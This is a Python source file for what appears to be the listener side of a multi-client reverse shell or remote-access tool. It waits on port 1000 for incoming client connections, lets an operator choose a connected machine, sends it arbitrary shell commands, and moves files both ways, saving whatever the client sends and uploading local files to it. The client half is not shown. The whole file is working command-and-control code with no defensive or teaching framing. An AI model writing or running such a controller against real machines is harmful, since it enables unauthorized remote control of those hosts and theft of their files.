#!/usr/bin/env python3

import sys
import time
import socket
from common import pr, cls, Send, Receive

# server socket
server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(('', 1000))
server.listen()
server.settimeout(10)

# client sockets
socks = []
clients = []
active = False

def close(sock, client):
  socks.remove(sock)
  clients.remove(client)
  sock.close() # rm first

def refresh():
  cls()
  pr('Listening for clients...')

  if not clients:
    return

  for i in range(0, len(clients)):
    pr('➡️ Client %d: %s' % (i, clients[i]))

  pr('Press Ctrl+C to interact with client')

while True:
  refresh()
  try:
    try:
      s, a = server.accept()
    except socket.timeout:
      continue
    s.settimeout(None)
    socks.append(s)
    clients.append(str(a))
    refresh()
  except KeyboardInterrupt:
    pr('\r')
    while True:
      n = input('Enter option: ')
      n = int(n)

      if n == -1:
        sys.exit()

      if n not in range(0, len(socks)):
        pr('⚠️ Index out of range')
        continue
      else:
        break

    sock = socks[n]
    client = clients[n]
    active = True

    Send(sock, 'pwd')
  while active:
    try:
      data = Receive(sock)
    except Exception as e:
      pr('⚠️', e)
      active = False
      close(sock, client)
      break

    if not data:
      pr('⚠️ Client %s disconnected' % client)
      active = False
      close(sock, client)
      break

    if type(data) == str:
      pr(data, end='')
    else:
      try:
        f = open(data[0], 'wb')
        f.write(data[1])
        f.close()
      except Exception as e:
        pr('⚠️', e)
      continue # more data to recv after file

    while True:
      nc = input()
      nc = nc.strip()
      if nc:
        break

    if nc == '-1':
      active = False
      close(sock, client)
      break

    elif nc.startswith('ul '):
      fn = nc[3:]
      try:
        f = open(fn, 'rb')
        d = f.read()
        f.close()
        Send(sock, d, fn)
        time.sleep(1)
      except Exception as e:
        pr('⚠️', e)
        Send(sock, 'cd')

    else:
      Send(sock, nc)
